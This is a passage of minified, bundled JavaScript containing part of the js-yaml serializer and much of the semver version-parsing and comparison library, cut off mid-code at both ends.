        return Re(P, Ae);
      }
      switch (
      je(H, ae, P.indent, fe, pe, P.quotingType, P.forceQuotes && !z, Q)
      ) {
        case me:
          return H;
        case Se:
          return "'" + H.replace(/'/g, "''") + "'";
        case _e:
          return "|" + ct(H, P.indent) + d(ce(H, ee));
        case Le:
          return ">" + ct(H, P.indent) + d(ce(B(H, fe), ee));
        case Ie:
          return '"' + re(H) + '"';
        default:
          throw new i("impossible error: invalid scalar style");
      }
    })();
  }
  function ct(P, H) {
    var X = ge(P) ? String(H) : "",
      z =
        P[P.length - 1] ===
        `
`,
      Q =
        z &&
        (P[P.length - 2] ===
          `
` ||
          P ===
          `
`),
      ee = Q ? "+" : z ? "" : "-";
    return (
      X +
      ee +
      `
`
    );
  }
  function d(P) {
    return P[P.length - 1] ===
      `
`
      ? P.slice(0, -1)
      : P;
  }
  function B(P, H) {
    for (
      var X = /(\n+)([^\n]*)/g,
      z = (function () {
        var Ae = P.indexOf(`
`);
        return (
          (Ae = Ae !== -1 ? Ae : P.length),
          (X.lastIndex = Ae),
          V(P.slice(0, Ae), H)
        );
      })(),
      Q =
        P[0] ===
        `
` || P[0] === " ",
      ee,
      fe;
      (fe = X.exec(P));

    ) {
      var ae = fe[1],
        pe = fe[2];
      (ee = pe[0] === " "),
        (z +=
          ae +
          (!Q && !ee && pe !== ""
            ? `
`
            : "") +
          V(pe, H)),
        (Q = ee);
    }
    return z;
  }
  function V(P, H) {
    if (P === "" || P[0] === " ") return P;
    for (
      var X = / [^ ]/g, z, Q = 0, ee, fe = 0, ae = 0, pe = "";
      (z = X.exec(P));

    )
      (ae = z.index),
        ae - Q > H &&
        ((ee = fe > Q ? fe : ae),
          (pe +=
            `
` + P.slice(Q, ee)),
          (Q = ee + 1)),
        (fe = ae);
    return (
      (pe += `
`),
      P.length - Q > H && fe > Q
        ? (pe +=
          P.slice(Q, fe) +
          `
` +
          P.slice(fe + 1))
        : (pe += P.slice(Q)),
      pe.slice(1)
    );
  }
  function re(P) {
    for (var H = "", X = 0, z, Q = 0; Q < P.length; X >= 65536 ? (Q += 2) : Q++)
      (X = le(P, Q)),
        (z = F[X]),
        !z && Ee(X)
          ? ((H += P[Q]), X >= 65536 && (H += P[Q + 1]))
          : (H += z || K(X));
    return H;
  }
  function W(P, H, X) {
    var z = "",
      Q = P.tag,
      ee,
      fe,
      ae;
    for (ee = 0, fe = X.length; ee < fe; ee += 1)
      (ae = X[ee]),
        P.replacer && (ae = P.replacer.call(X, String(ee), ae)),
        (we(P, H, ae, !1, !1) || (typeof ae > "u" && we(P, H, null, !1, !1))) &&
        (z !== "" && (z += "," + (P.condenseFlow ? "" : " ")), (z += P.dump));
    (P.tag = Q), (P.dump = "[" + z + "]");
  }
  function te(P, H, X, z) {
    var Q = "",
      ee = P.tag,
      fe,
      ae,
      pe;
    for (fe = 0, ae = X.length; fe < ae; fe += 1)
      (pe = X[fe]),
        P.replacer && (pe = P.replacer.call(X, String(fe), pe)),
        (we(P, H + 1, pe, !0, !0, !1, !0) ||
          (typeof pe > "u" && we(P, H + 1, null, !0, !0, !1, !0))) &&
        ((!z || Q !== "") && (Q += ie(P, H)),
          P.dump && l === P.dump.charCodeAt(0) ? (Q += "-") : (Q += "- "),
          (Q += P.dump));
    (P.tag = ee), (P.dump = Q || "[]");
  }
  function Z(P, H, X) {
    var z = "",
      Q = P.tag,
      ee = Object.keys(X),
      fe,
      ae,
      pe,
      Ae,
      Oe;
    for (fe = 0, ae = ee.length; fe < ae; fe += 1)
      (Oe = ""),
        z !== "" && (Oe += ", "),
        P.condenseFlow && (Oe += '"'),
        (pe = ee[fe]),
        (Ae = X[pe]),
        P.replacer && (Ae = P.replacer.call(X, pe, Ae)),
        we(P, H, pe, !1, !1) &&
        (P.dump.length > 1024 && (Oe += "? "),
          (Oe +=
            P.dump +
            (P.condenseFlow ? '"' : "") +
            ":" +
            (P.condenseFlow ? "" : " ")),
          we(P, H, Ae, !1, !1) && ((Oe += P.dump), (z += Oe)));
    (P.tag = Q), (P.dump = "{" + z + "}");
  }
  function oe(P, H, X, z) {
    var Q = "",
      ee = P.tag,
      fe = Object.keys(X),
      ae,
      pe,
      Ae,
      Oe,
      Ne,
      Ce;
    if (P.sortKeys === !0) fe.sort();
    else if (typeof P.sortKeys == "function") fe.sort(P.sortKeys);
    else if (P.sortKeys)
      throw new i("sortKeys must be a boolean or a function");
    for (ae = 0, pe = fe.length; ae < pe; ae += 1)
      (Ce = ""),
        (!z || Q !== "") && (Ce += ie(P, H)),
        (Ae = fe[ae]),
        (Oe = X[Ae]),
        P.replacer && (Oe = P.replacer.call(X, Ae, Oe)),
        we(P, H + 1, Ae, !0, !0, !0) &&
        ((Ne =
          (P.tag !== null && P.tag !== "?") ||
          (P.dump && P.dump.length > 1024)),
          Ne &&
          (P.dump && l === P.dump.charCodeAt(0) ? (Ce += "?") : (Ce += "? ")),
          (Ce += P.dump),
          Ne && (Ce += ie(P, H)),
          we(P, H + 1, Oe, !0, Ne) &&
          (P.dump && l === P.dump.charCodeAt(0) ? (Ce += ":") : (Ce += ": "),
            (Ce += P.dump),
            (Q += Ce)));
    (P.tag = ee), (P.dump = Q || "{}");
  }
  function ve(P, H, X) {
    var z, Q, ee, fe, ae, pe;
    for (
      Q = X ? P.explicitTypes : P.implicitTypes, ee = 0, fe = Q.length;
      ee < fe;
      ee += 1
    )
      if (
        ((ae = Q[ee]),
          (ae.instanceOf || ae.predicate) &&
          (!ae.instanceOf ||
            (typeof H == "object" && H instanceof ae.instanceOf)) &&
          (!ae.predicate || ae.predicate(H)))
      ) {
        if (
          (X
            ? ae.multi && ae.representName
              ? (P.tag = ae.representName(H))
              : (P.tag = ae.tag)
            : (P.tag = "?"),
            ae.represent)
        ) {
          if (
            ((pe = P.styleMap[ae.tag] || ae.defaultStyle),
              h.call(ae.represent) === "[object Function]")
          )
            z = ae.represent(H, pe);
          else if (f.call(ae.represent, pe)) z = ae.represent[pe](H, pe);
          else
            throw new i(
              "!<" + ae.tag + '> tag resolver accepts not "' + pe + '" style'
            );
          P.dump = z;
        }
        return !0;
      }
    return !1;
  }
  function we(P, H, X, z, Q, ee, fe) {
    (P.tag = null), (P.dump = X), ve(P, X, !1) || ve(P, X, !0);
    var ae = h.call(P.dump),
      pe = z,
      Ae;
    z && (z = P.flowLevel < 0 || P.flowLevel > H);
    var Oe = ae === "[object Object]" || ae === "[object Array]",
      Ne,
      Ce;
    if (
      (Oe && ((Ne = P.duplicates.indexOf(X)), (Ce = Ne !== -1)),
        ((P.tag !== null && P.tag !== "?") || Ce || (P.indent !== 2 && H > 0)) &&
        (Q = !1),
        Ce && P.usedDuplicates[Ne])
    )
      P.dump = "*ref_" + Ne;
    else {
      if (
        (Oe && Ce && !P.usedDuplicates[Ne] && (P.usedDuplicates[Ne] = !0),
          ae === "[object Object]")
      )
        z && Object.keys(P.dump).length !== 0
          ? (oe(P, H, P.dump, Q), Ce && (P.dump = "&ref_" + Ne + P.dump))
          : (Z(P, H, P.dump), Ce && (P.dump = "&ref_" + Ne + " " + P.dump));
      else if (ae === "[object Array]")
        z && P.dump.length !== 0
          ? (P.noArrayIndent && !fe && H > 0
            ? te(P, H - 1, P.dump, Q)
            : te(P, H, P.dump, Q),
            Ce && (P.dump = "&ref_" + Ne + P.dump))
          : (W(P, H, P.dump), Ce && (P.dump = "&ref_" + Ne + " " + P.dump));
      else if (ae === "[object String]")
        P.tag !== "?" && _t(P, P.dump, H, ee, pe);
      else {
        if (ae === "[object Undefined]") return !1;
        if (P.skipInvalid) return !1;
        throw new i("unacceptable kind of an object to dump " + ae);
      }
      P.tag !== null &&
        P.tag !== "?" &&
        ((Ae = encodeURI(P.tag[0] === "!" ? P.tag.slice(1) : P.tag).replace(
          /!/g,
          "%21"
        )),
          P.tag[0] === "!"
            ? (Ae = "!" + Ae)
            : Ae.slice(0, 18) === "tag:yaml.org,2002:"
              ? (Ae = "!!" + Ae.slice(18))
              : (Ae = "!<" + Ae + ">"),
          (P.dump = Ae + " " + P.dump));
    }
    return !0;
  }
  function Pe(P, H) {
    var X = [],
      z = [],
      Q,
      ee;
    for (de(P, X, z), Q = 0, ee = z.length; Q < ee; Q += 1)
      H.duplicates.push(X[z[Q]]);
    H.usedDuplicates = new Array(ee);
  }
  function de(P, H, X) {
    var z, Q, ee;
    if (P !== null && typeof P == "object")
      if (((Q = H.indexOf(P)), Q !== -1)) X.indexOf(Q) === -1 && X.push(Q);
      else if ((H.push(P), Array.isArray(P)))
        for (Q = 0, ee = P.length; Q < ee; Q += 1) de(P[Q], H, X);
      else
        for (z = Object.keys(P), Q = 0, ee = z.length; Q < ee; Q += 1)
          de(P[z[Q]], H, X);
  }
  function Ue(P, H) {
    H = H || {};
    var X = new se(H);
    X.noRefs || Pe(P, X);
    var z = P;
    return (
      X.replacer && (z = X.replacer.call({ "": z }, "", z)),
      we(X, 0, z, !0, !0)
        ? X.dump +
        `
`
        : ""
    );
  }
  return (ui.dump = Ue), ui;
}
var bs;
function xo() {
  if (bs) return Ve;
  bs = 1;
  var a = Mf(),
    i = Bf();
  function c(h, f) {
    return function () {
      throw new Error(
        "Function yaml." +
        h +
        " is removed in js-yaml 4. Use yaml." +
        f +
        " instead, which is now safe by default."
      );
    };
  }
  return (
    (Ve.Type = ze()),
    (Ve.Schema = Cl()),
    (Ve.FAILSAFE_SCHEMA = xl()),
    (Ve.JSON_SCHEMA = Ul()),
    (Ve.CORE_SCHEMA = kl()),
    (Ve.DEFAULT_SCHEMA = Do()),
    (Ve.load = a.load),
    (Ve.loadAll = a.loadAll),
    (Ve.dump = i.dump),
    (Ve.YAMLException = Tr()),
    (Ve.types = {
      binary: Bl(),
      float: Ll(),
      map: Dl(),
      null: Nl(),
      pairs: Hl(),
      set: Gl(),
      timestamp: ql(),
      bool: Fl(),
      int: $l(),
      merge: Ml(),
      omap: jl(),
      seq: Ol(),
      str: Il(),
    }),
    (Ve.safeLoad = c("safeLoad", "load")),
    (Ve.safeLoadAll = c("safeLoadAll", "loadAll")),
    (Ve.safeDump = c("safeDump", "dump")),
    Ve
  );
}
var tr = {},
  Rs;
function jf() {
  if (Rs) return tr;
  (Rs = 1),
    Object.defineProperty(tr, "__esModule", { value: !0 }),
    (tr.Lazy = void 0);
  class a {
    constructor(c) {
      (this._value = null), (this.creator = c);
    }
    get hasValue() {
      return this.creator == null;
    }
    get value() {
      if (this.creator == null) return this._value;
      const c = this.creator();
      return (this.value = c), c;
    }
    set value(c) {
      (this._value = c), (this.creator = null);
    }
  }
  return (tr.Lazy = a), tr;
}
var jr = { exports: {} },
  li,
  Ps;
function Yr() {
  if (Ps) return li;
  Ps = 1;
  const a = "2.0.0",
    i = 256,
    c = Number.MAX_SAFE_INTEGER || 9007199254740991,
    h = 16,
    f = i - 6;
  return (
    (li = {
      MAX_LENGTH: i,
      MAX_SAFE_COMPONENT_LENGTH: h,
      MAX_SAFE_BUILD_LENGTH: f,
      MAX_SAFE_INTEGER: c,
      RELEASE_TYPES: [
        "major",
        "premajor",
        "minor",
        "preminor",
        "patch",
        "prepatch",
        "prerelease",
      ],
      SEMVER_SPEC_VERSION: a,
      FLAG_INCLUDE_PRERELEASE: 1,
      FLAG_LOOSE: 2,
    }),
    li
  );
}
var ci, Cs;
function Kr() {
  return (
    Cs ||
    ((Cs = 1),
      (ci =
        typeof process == "object" &&
          process.env &&
          process.env.NODE_DEBUG &&
          /\bsemver\b/i.test(process.env.NODE_DEBUG)
          ? (...i) => console.error("SEMVER", ...i)
          : () => { })),
    ci
  );
}
var Is;
function br() {
  return (
    Is ||
    ((Is = 1),
      (function (a, i) {
        const {
          MAX_SAFE_COMPONENT_LENGTH: c,
          MAX_SAFE_BUILD_LENGTH: h,
          MAX_LENGTH: f,
        } = Yr(),
          t = Kr();
        i = a.exports = {};
        const r = (i.re = []),
          l = (i.safeRe = []),
          e = (i.src = []),
          o = (i.safeSrc = []),
          n = (i.t = {});
        let s = 0;
        const u = "[a-zA-Z0-9-]",
          m = [
            ["\\s", 1],
            ["\\d", f],
            [u, h],
          ],
          E = (p) => {
            for (const [A, S] of m)
              p = p
                .split(`${A}*`)
                .join(`${A}{0,${S}}`)
                .split(`${A}+`)
                .join(`${A}{1,${S}}`);
            return p;
          },
          y = (p, A, S) => {
            const b = E(A),
              R = s++;
            t(p, R, A),
              (n[p] = R),
              (e[R] = A),
              (o[R] = b),
              (r[R] = new RegExp(A, S ? "g" : void 0)),
              (l[R] = new RegExp(b, S ? "g" : void 0));
          };
        y("NUMERICIDENTIFIER", "0|[1-9]\\d*"),
          y("NUMERICIDENTIFIERLOOSE", "\\d+"),
          y("NONNUMERICIDENTIFIER", `\\d*[a-zA-Z-]${u}*`),
          y(
            "MAINVERSION",
            `(${e[n.NUMERICIDENTIFIER]})\\.(${e[n.NUMERICIDENTIFIER]})\\.(${e[n.NUMERICIDENTIFIER]
            })`
          ),
          y(
            "MAINVERSIONLOOSE",
            `(${e[n.NUMERICIDENTIFIERLOOSE]})\\.(${e[n.NUMERICIDENTIFIERLOOSE]
            })\\.(${e[n.NUMERICIDENTIFIERLOOSE]})`
          ),
          y(
            "PRERELEASEIDENTIFIER",
            `(?:${e[n.NONNUMERICIDENTIFIER]}|${e[n.NUMERICIDENTIFIER]})`
          ),
          y(
            "PRERELEASEIDENTIFIERLOOSE",
            `(?:${e[n.NONNUMERICIDENTIFIER]}|${e[n.NUMERICIDENTIFIERLOOSE]})`
          ),
          y(
            "PRERELEASE",
            `(?:-(${e[n.PRERELEASEIDENTIFIER]}(?:\\.${e[n.PRERELEASEIDENTIFIER]
            })*))`
          ),
          y(
            "PRERELEASELOOSE",
            `(?:-?(${e[n.PRERELEASEIDENTIFIERLOOSE]}(?:\\.${e[n.PRERELEASEIDENTIFIERLOOSE]
            })*))`
          ),
          y("BUILDIDENTIFIER", `${u}+`),
          y(
            "BUILD",
            `(?:\\+(${e[n.BUILDIDENTIFIER]}(?:\\.${e[n.BUILDIDENTIFIER]})*))`
          ),
          y(
            "FULLPLAIN",
            `v?${e[n.MAINVERSION]}${e[n.PRERELEASE]}?${e[n.BUILD]}?`
          ),
          y("FULL", `^${e[n.FULLPLAIN]}$`),
          y(
            "LOOSEPLAIN",
            `[v=\\s]*${e[n.MAINVERSIONLOOSE]}${e[n.PRERELEASELOOSE]}?${e[n.BUILD]
            }?`
          ),
          y("LOOSE", `^${e[n.LOOSEPLAIN]}$`),
          y("GTLT", "((?:<|>)?=?)"),
          y("XRANGEIDENTIFIERLOOSE", `${e[n.NUMERICIDENTIFIERLOOSE]}|x|X|\\*`),
          y("XRANGEIDENTIFIER", `${e[n.NUMERICIDENTIFIER]}|x|X|\\*`),
          y(
            "XRANGEPLAIN",
            `[v=\\s]*(${e[n.XRANGEIDENTIFIER]})(?:\\.(${e[n.XRANGEIDENTIFIER]
            })(?:\\.(${e[n.XRANGEIDENTIFIER]})(?:${e[n.PRERELEASE]})?${e[n.BUILD]
            }?)?)?`
          ),
          y(
            "XRANGEPLAINLOOSE",
            `[v=\\s]*(${e[n.XRANGEIDENTIFIERLOOSE]})(?:\\.(${e[n.XRANGEIDENTIFIERLOOSE]
            })(?:\\.(${e[n.XRANGEIDENTIFIERLOOSE]})(?:${e[n.PRERELEASELOOSE]
            })?${e[n.BUILD]}?)?)?`
          ),
          y("XRANGE", `^${e[n.GTLT]}\\s*${e[n.XRANGEPLAIN]}$`),
          y("XRANGELOOSE", `^${e[n.GTLT]}\\s*${e[n.XRANGEPLAINLOOSE]}$`),
          y(
            "COERCEPLAIN",
            `(^|[^\\d])(\\d{1,${c}})(?:\\.(\\d{1,${c}}))?(?:\\.(\\d{1,${c}}))?`
          ),
          y("COERCE", `${e[n.COERCEPLAIN]}(?:$|[^\\d])`),
          y(
            "COERCEFULL",
            e[n.COERCEPLAIN] +
            `(?:${e[n.PRERELEASE]})?(?:${e[n.BUILD]})?(?:$|[^\\d])`
          ),
          y("COERCERTL", e[n.COERCE], !0),
          y("COERCERTLFULL", e[n.COERCEFULL], !0),
          y("LONETILDE", "(?:~>?)"),
          y("TILDETRIM", `(\\s*)${e[n.LONETILDE]}\\s+`, !0),
          (i.tildeTrimReplace = "$1~"),
          y("TILDE", `^${e[n.LONETILDE]}${e[n.XRANGEPLAIN]}$`),
          y("TILDELOOSE", `^${e[n.LONETILDE]}${e[n.XRANGEPLAINLOOSE]}$`),
          y("LONECARET", "(?:\\^)"),
          y("CARETTRIM", `(\\s*)${e[n.LONECARET]}\\s+`, !0),
          (i.caretTrimReplace = "$1^"),
          y("CARET", `^${e[n.LONECARET]}${e[n.XRANGEPLAIN]}$`),
          y("CARETLOOSE", `^${e[n.LONECARET]}${e[n.XRANGEPLAINLOOSE]}$`),
          y("COMPARATORLOOSE", `^${e[n.GTLT]}\\s*(${e[n.LOOSEPLAIN]})$|^$`),
          y("COMPARATOR", `^${e[n.GTLT]}\\s*(${e[n.FULLPLAIN]})$|^$`),
          y(
            "COMPARATORTRIM",
            `(\\s*)${e[n.GTLT]}\\s*(${e[n.LOOSEPLAIN]}|${e[n.XRANGEPLAIN]})`,
            !0
          ),
          (i.comparatorTrimReplace = "$1$2$3"),
          y(
            "HYPHENRANGE",
            `^\\s*(${e[n.XRANGEPLAIN]})\\s+-\\s+(${e[n.XRANGEPLAIN]})\\s*$`
          ),
          y(
            "HYPHENRANGELOOSE",
            `^\\s*(${e[n.XRANGEPLAINLOOSE]})\\s+-\\s+(${e[n.XRANGEPLAINLOOSE]
            })\\s*$`
          ),
          y("STAR", "(<|>)?=?\\s*\\*"),
          y("GTE0", "^\\s*>=\\s*0\\.0\\.0\\s*$"),
          y("GTE0PRE", "^\\s*>=\\s*0\\.0\\.0-0\\s*$");
      })(jr, jr.exports)),
    jr.exports
  );
}
var fi, Os;
function No() {
  if (Os) return fi;
  Os = 1;
  const a = Object.freeze({ loose: !0 }),
    i = Object.freeze({});
  return (fi = (h) => (h ? (typeof h != "object" ? a : h) : i)), fi;
}
var di, Ds;
function Vl() {
  if (Ds) return di;
  Ds = 1;
  const a = /^[0-9]+$/,
    i = (h, f) => {
      const t = a.test(h),
        r = a.test(f);
      return (
        t && r && ((h = +h), (f = +f)),
        h === f ? 0 : t && !r ? -1 : r && !t ? 1 : h < f ? -1 : 1
      );
    };
  return (
    (di = { compareIdentifiers: i, rcompareIdentifiers: (h, f) => i(f, h) }), di
  );
}
var hi, xs;
function Ye() {
  if (xs) return hi;
  xs = 1;
  const a = Kr(),
    { MAX_LENGTH: i, MAX_SAFE_INTEGER: c } = Yr(),
    { safeRe: h, t: f } = br(),
    t = No(),
    { compareIdentifiers: r } = Vl();
  class l {
    constructor(o, n) {
      if (((n = t(n)), o instanceof l)) {
        if (
          o.loose === !!n.loose &&
          o.includePrerelease === !!n.includePrerelease
        )
          return o;
        o = o.version;
      } else if (typeof o != "string")
        throw new TypeError(
          `Invalid version. Must be a string. Got type "${typeof o}".`
        );
      if (o.length > i)
        throw new TypeError(`version is longer than ${i} characters`);
      a("SemVer", o, n),
        (this.options = n),
        (this.loose = !!n.loose),
        (this.includePrerelease = !!n.includePrerelease);
      const s = o.trim().match(n.loose ? h[f.LOOSE] : h[f.FULL]);
      if (!s) throw new TypeError(`Invalid Version: ${o}`);
      if (
        ((this.raw = o),
          (this.major = +s[1]),
          (this.minor = +s[2]),
          (this.patch = +s[3]),
          this.major > c || this.major < 0)
      )
        throw new TypeError("Invalid major version");
      if (this.minor > c || this.minor < 0)
        throw new TypeError("Invalid minor version");
      if (this.patch > c || this.patch < 0)
        throw new TypeError("Invalid patch version");
      s[4]
        ? (this.prerelease = s[4].split(".").map((u) => {
          if (/^[0-9]+$/.test(u)) {
            const m = +u;
            if (m >= 0 && m < c) return m;
          }
          return u;
        }))
        : (this.prerelease = []),
        (this.build = s[5] ? s[5].split(".") : []),
        this.format();
    }
    format() {
      return (
        (this.version = `${this.major}.${this.minor}.${this.patch}`),
        this.prerelease.length &&
        (this.version += `-${this.prerelease.join(".")}`),
        this.version
      );
    }
    toString() {
      return this.version;
    }
    compare(o) {
      if (
        (a("SemVer.compare", this.version, this.options, o), !(o instanceof l))
      ) {
        if (typeof o == "string" && o === this.version) return 0;
        o = new l(o, this.options);
      }
      return o.version === this.version
        ? 0
        : this.compareMain(o) || this.comparePre(o);
    }
    compareMain(o) {
      return (
        o instanceof l || (o = new l(o, this.options)),
        r(this.major, o.major) ||
        r(this.minor, o.minor) ||
        r(this.patch, o.patch)
      );
    }
    comparePre(o) {
      if (
        (o instanceof l || (o = new l(o, this.options)),
          this.prerelease.length && !o.prerelease.length)
      )
        return -1;
      if (!this.prerelease.length && o.prerelease.length) return 1;
      if (!this.prerelease.length && !o.prerelease.length) return 0;
      let n = 0;
      do {
        const s = this.prerelease[n],
          u = o.prerelease[n];
        if ((a("prerelease compare", n, s, u), s === void 0 && u === void 0))
          return 0;
        if (u === void 0) return 1;
        if (s === void 0) return -1;
        if (s === u) continue;
        return r(s, u);
      } while (++n);
    }
    compareBuild(o) {
      o instanceof l || (o = new l(o, this.options));
      let n = 0;
      do {
        const s = this.build[n],
          u = o.build[n];
        if ((a("build compare", n, s, u), s === void 0 && u === void 0))
          return 0;
        if (u === void 0) return 1;
        if (s === void 0) return -1;
        if (s === u) continue;
        return r(s, u);
      } while (++n);
    }
    inc(o, n, s) {
      if (o.startsWith("pre")) {
        if (!n && s === !1)
          throw new Error("invalid increment argument: identifier is empty");
        if (n) {
          const u = `-${n}`.match(
            this.options.loose ? h[f.PRERELEASELOOSE] : h[f.PRERELEASE]
          );
          if (!u || u[1] !== n) throw new Error(`invalid identifier: ${n}`);
        }
      }
      switch (o) {
        case "premajor":
          (this.prerelease.length = 0),
            (this.patch = 0),
            (this.minor = 0),
            this.major++,
            this.inc("pre", n, s);
          break;
        case "preminor":
          (this.prerelease.length = 0),
            (this.patch = 0),
            this.minor++,
            this.inc("pre", n, s);
          break;
        case "prepatch":
          (this.prerelease.length = 0),
            this.inc("patch", n, s),
            this.inc("pre", n, s);
          break;
        case "prerelease":
          this.prerelease.length === 0 && this.inc("patch", n, s),
            this.inc("pre", n, s);
          break;
        case "release":
          if (this.prerelease.length === 0)
            throw new Error(`version ${this.raw} is not a prerelease`);
          this.prerelease.length = 0;
          break;
        case "major":
          (this.minor !== 0 ||
            this.patch !== 0 ||
            this.prerelease.length === 0) &&
            this.major++,
            (this.minor = 0),
            (this.patch = 0),
            (this.prerelease = []);
          break;
        case "minor":
          (this.patch !== 0 || this.prerelease.length === 0) && this.minor++,
            (this.patch = 0),
            (this.prerelease = []);
          break;
        case "patch":
          this.prerelease.length === 0 && this.patch++, (this.prerelease = []);
          break;
        case "pre": {
          const u = Number(s) ? 1 : 0;
          if (this.prerelease.length === 0) this.prerelease = [u];
          else {
            let m = this.prerelease.length;
            for (; --m >= 0;)
              typeof this.prerelease[m] == "number" &&
                (this.prerelease[m]++, (m = -2));
            if (m === -1) {
              if (n === this.prerelease.join(".") && s === !1)
                throw new Error(
                  "invalid increment argument: identifier already exists"
                );
              this.prerelease.push(u);
            }
          }
          if (n) {
            let m = [n, u];
            s === !1 && (m = [n]),
              r(this.prerelease[0], n) === 0
                ? isNaN(this.prerelease[1]) && (this.prerelease = m)
                : (this.prerelease = m);
          }
          break;
        }
        default:
          throw new Error(`invalid increment argument: ${o}`);
      }
      return (
        (this.raw = this.format()),
        this.build.length && (this.raw += `+${this.build.join(".")}`),
        this
      );
    }
  }
  return (hi = l), hi;
}
var pi, Ns;
function zt() {
  if (Ns) return pi;
  Ns = 1;
  const a = Ye();
  return (
    (pi = (c, h, f = !1) => {
      if (c instanceof a) return c;
      try {
        return new a(c, h);
      } catch (t) {
        if (!f) return null;
        throw t;
      }
    }),
    pi
  );
}
var mi, Fs;
function Hf() {
  if (Fs) return mi;
  Fs = 1;
  const a = zt();
  return (
    (mi = (c, h) => {
      const f = a(c, h);
      return f ? f.version : null;
    }),
    mi
  );
}
var gi, $s;
function Gf() {
  if ($s) return gi;
  $s = 1;
  const a = zt();
  return (
    (gi = (c, h) => {
      const f = a(c.trim().replace(/^[=v]+/, ""), h);
      return f ? f.version : null;
    }),
    gi
  );
}
var vi, Ls;
function Vf() {
  if (Ls) return vi;
  Ls = 1;
  const a = Ye();
  return (
    (vi = (c, h, f, t, r) => {
      typeof f == "string" && ((r = t), (t = f), (f = void 0));
      try {
        return new a(c instanceof a ? c.version : c, f).inc(h, t, r).version;
      } catch {
        return null;
      }
    }),
    vi
  );
}
var wi, Us;
function Wf() {
  if (Us) return wi;
  Us = 1;
  const a = zt();
  return (
    (wi = (c, h) => {
      const f = a(c, null, !0),
        t = a(h, null, !0),
        r = f.compare(t);
      if (r === 0) return null;
      const l = r > 0,
        e = l ? f : t,
        o = l ? t : f,
        n = !!e.prerelease.length;
      if (!!o.prerelease.length && !n) {
        if (!o.patch && !o.minor) return "major";
        if (o.compareMain(e) === 0)
          return o.minor && !o.patch ? "minor" : "patch";
      }
      const u = n ? "pre" : "";
      return f.major !== t.major
        ? u + "major"
        : f.minor !== t.minor
          ? u + "minor"
          : f.patch !== t.patch
            ? u + "patch"
            : "prerelease";
    }),
    wi
  );
}
var yi, ks;
function zf() {
  if (ks) return yi;
  ks = 1;
  const a = Ye();
  return (yi = (c, h) => new a(c, h).major), yi;
}
var Ei, qs;
function Yf() {
  if (qs) return Ei;
  qs = 1;
  const a = Ye();
  return (Ei = (c, h) => new a(c, h).minor), Ei;
}
var _i, Ms;
function Kf() {
  if (Ms) return _i;
  Ms = 1;
  const a = Ye();
  return (_i = (c, h) => new a(c, h).patch), _i;
}
var Ai, Bs;
function Xf() {
  if (Bs) return Ai;
  Bs = 1;
  const a = zt();
  return (
    (Ai = (c, h) => {
      const f = a(c, h);
      return f && f.prerelease.length ? f.prerelease : null;
    }),
    Ai
  );
}
var Si, js;
function at() {
  if (js) return Si;
  js = 1;
  const a = Ye();
  return (Si = (c, h, f) => new a(c, f).compare(new a(h, f))), Si;
}
var Ti, Hs;
function Jf() {
  if (Hs) return Ti;
  Hs = 1;
  const a = at();
  return (Ti = (c, h, f) => a(h, c, f)), Ti;
}
var bi, Gs;
function Qf() {
  if (Gs) return bi;
  Gs = 1;
  const a = at();
  return (bi = (c, h) => a(c, h, !0)), bi;
}
var Ri, Vs;
function Fo() {
  if (Vs) return Ri;
  Vs = 1;
  const a = Ye();
  return (
    (Ri = (c, h, f) => {
      const t = new a(c, f),
        r = new a(h, f);
      return t.compare(r) || t.compareBuild(r);
    }),
    Ri
  );
}
var Pi, Ws;
function Zf() {
  if (Ws) return Pi;
  Ws = 1;
  const a = Fo();
  return (Pi = (c, h) => c.sort((f, t) => a(f, t, h))), Pi;
}
var Ci, zs;
function ed() {
  if (zs) return Ci;
  zs = 1;
  const a = Fo();
  return (Ci = (c, h) => c.sort((f, t) => a(t, f, h))), Ci;
}
var Ii, Ys;
function Xr() {
  if (Ys) return Ii;
  Ys = 1;
  const a = at();
  return (Ii = (c, h, f) => a(c, h, f) > 0), Ii;
}
var Oi, Ks;
function $o() {
  if (Ks) return Oi;
  Ks = 1;
  const a = at();
  return (Oi = (c, h, f) => a(c, h, f) < 0), Oi;
}
var Di, Xs;
function Wl() {
  if (Xs) return Di;
  Xs = 1;
  const a = at();
  return (Di = (c, h, f) => a(c, h, f) === 0), Di;
}
var xi, Js;
function zl() {
  if (Js) return xi;
  Js = 1;
  const a = at();
  return (xi = (c, h, f) => a(c, h, f) !== 0), xi;
}
var Ni, Qs;
function Lo() {
  if (Qs) return Ni;
  Qs = 1;
  const a = at();
  return (Ni = (c, h, f) => a(c, h, f) >= 0), Ni;
}
var Fi, Zs;
function Uo() {
  if (Zs) return Fi;
  Zs = 1;
  const a = at();
  return (Fi = (c, h, f) => a(c, h, f) <= 0), Fi;
}
var $i, eu;
function Yl() {
  if (eu) return $i;
  eu = 1;
  const a = Wl(),
    i = zl(),
    c = Xr(),
    h = Lo(),
    f = $o(),
    t = Uo();
  return (
    ($i = (l, e, o, n) => {
      switch (e) {
        case "===":
          return (
            typeof l == "object" && (l = l.version),
            typeof o == "object" && (o = o.version),
            l === o
          );
        case "!==":
          return (
            typeof l == "object" && (l = l.version),
            typeof o == "object" && (o = o.version),
            l !== o
          );
        case "":
        case "=":
        case "==":
          return a(l, o, n);
        case "!=":
          return i(l, o, n);
        case ">":
          return c(l, o, n);
        case ">=":
          return h(l, o, n);
        case "<":
          return f(l, o, n);
        case "<=":
          return t(l, o, n);
        default:
          throw new TypeError(`Invalid operator: ${e}`);
      }
    }),
    $i
  );
}
var Li, tu;
function td() {
  if (tu) return Li;
  tu = 1;
  const a = Ye(),
    i = zt(),
    { safeRe: c, t: h } = br();
  return (
    (Li = (t, r) => {
      if (t instanceof a) return t;
      if ((typeof t == "number" && (t = String(t)), typeof t != "string"))
        return null;
      r = r || {};
      let l = null;
      if (!r.rtl)
        l = t.match(r.includePrerelease ? c[h.COERCEFULL] : c[h.COERCE]);
      else {
        const m = r.includePrerelease ? c[h.COERCERTLFULL] : c[h.COERCERTL];
        let E;
        for (; (E = m.exec(t)) && (!l || l.index + l[0].length !== t.length);)
          (!l || E.index + E[0].length !== l.index + l[0].length) && (l = E),
            (m.lastIndex = E.index + E[1].length + E[2].length);
        m.lastIndex = -1;
      }
      if (l === null) return null;
      const e = l[2],
        o = l[3] || "0",
        n = l[4] || "0",
        s = r.includePrerelease && l[5] ? `-${l[5]}` : "",
        u = r.includePrerelease && l[6] ? `+${l[6]}` : "";
      return i(`${e}.${o}.${n}${s}${u}`, r);
    }),
    Li
  );
}
var Ui, ru;
function rd() {
  if (ru) return Ui;
  ru = 1;
  class a {
    constructor() {
      (this.max = 1e3), (this.map = new Map());
    }
    get(c) {
